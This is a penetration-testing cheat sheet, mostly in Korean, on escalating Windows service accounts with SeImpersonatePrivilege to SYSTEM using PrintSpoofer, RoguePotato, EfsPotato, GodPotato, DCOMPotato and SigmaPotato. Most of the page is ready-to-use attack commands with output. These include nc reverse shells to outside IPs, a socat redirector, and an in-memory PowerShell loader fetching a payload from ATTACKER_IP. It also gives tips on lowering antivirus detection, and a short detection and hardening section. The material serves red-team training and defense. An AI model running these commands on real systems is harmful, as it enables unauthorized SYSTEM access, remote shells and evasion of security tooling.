# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 요구사항 및 일반적인 주의점

다음의 모든 기법은 이러한 권한 중 하나를 보유한 컨텍스트에서 impersonation-capable privileged service를 악용하는 것에 의존합니다:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- 토큰에 이미 SeImpersonatePrivilege가 있는 경우(예: IIS AppPool, MSSQL 등 많은 서비스 계정에 흔함) High integrity는 필요하지 않습니다.

권한을 빠르게 확인:
```cmd
whoami /priv | findstr /i impersonate
```
운영 노트:

- PrintSpoofer는 Print Spooler 서비스가 실행 중이고 로컬 RPC 엔드포인트 (spoolss)를 통해 접근 가능해야 합니다. 강화된 환경에서 PrintNightmare 이후 Spooler가 비활성화된 경우 RoguePotato/GodPotato/DCOMPotato/EfsPotato를 선호하세요.
- RoguePotato는 TCP/135에서 접근 가능한 OXID resolver가 필요합니다. 이그레스가 차단된 경우 리디렉터/포트 포워더를 사용하세요(아래 예시 참조). 이전 빌드는 -f 플래그가 필요했습니다.
- EfsPotato/SharpEfsPotato는 MS-EFSR을 악용합니다; 특정 파이프가 차단되면 대체 파이프(lsarpc, efsrpc, samr, lsass, netlogon)를 시도하세요.
- RpcBindingSetAuthInfo 중 Error 0x6d3는 일반적으로 알려지지 않았거나 지원되지 않는 RPC 인증 서비스임을 나타냅니다; 다른 파이프/전송을 시도하거나 대상 서비스가 실행 중인지 확인하세요.

## 빠른 데모

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
참고:
- 현재 콘솔에서 대화형 프로세스를 생성하려면 -i를 사용하고, 한 줄 명령을 실행하려면 -c를 사용할 수 있습니다.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 실패합니다.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
outbound 135가 차단된 경우, redirector에서 socat을 통해 OXID resolver를 pivot하세요:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
팁: 한 pipe가 실패하거나 EDR이 차단하면, 지원되는 다른 pipes를 시도해보세요:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
참고:
- SeImpersonatePrivilege가 존재할 경우 Windows 8/8.1–11 및 Server 2012–2022에서 작동합니다.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 RPC_C_IMP_LEVEL_IMPERSONATE를 기본값으로 하는 서비스 DCOM 객체를 대상으로 하는 두 가지 변형을 제공합니다. 제공된 binaries를 빌드하거나 사용한 뒤 명령을 실행하세요:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (업데이트된 GodPotato 포크)

SigmaPotato는 .NET reflection을 통한 메모리 내 실행과 PowerShell reverse shell helper 같은 최신 편의 기능을 추가합니다.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 탐지 및 하드닝 참고사항

- 명명된 파이프(named pipes)를 생성하고 즉시 token-duplication APIs를 호출한 후 CreateProcessAsUser/CreateProcessWithTokenW를 호출하는 프로세스를 모니터링하세요. Sysmon은 유용한 텔레메트리를 제공할 수 있습니다: Event ID 1 (process creation), 17/18 (named pipe created/connected), 및 SYSTEM으로 자식 프로세스를 생성하는 명령줄.
- Spooler hardening: 필요 없는 서버에서 Print Spooler 서비스를 비활성화하면 spoolss를 통한 PrintSpoofer-style 로컬 강제 실행을 방지할 수 있습니다.
- Service account hardening: 커스텀 서비스에 SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege 할당을 최소화하세요. 가능한 경우 최소 권한의 가상 계정으로 서비스를 실행하고, service SID 및 write-restricted tokens로 격리하는 것을 고려하세요.
- Network controls: 아웃바운드 TCP/135를 차단하거나 RPC endpoint mapper 트래픽을 제한하면 내부 redirector가 없는 한 RoguePotato를 방해할 수 있습니다.
- EDR/AV: 이 도구들은 모두 널리 시그니처화되어 있습니다. 소스에서 다시 컴파일하거나 심볼/문자열을 변경하거나 인메모리 실행을 사용하면 탐지율을 낮출 수 있지만, 견고한 행위 기반 탐지를 완전히 회피하지는 못합니다.

## 참고자료

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
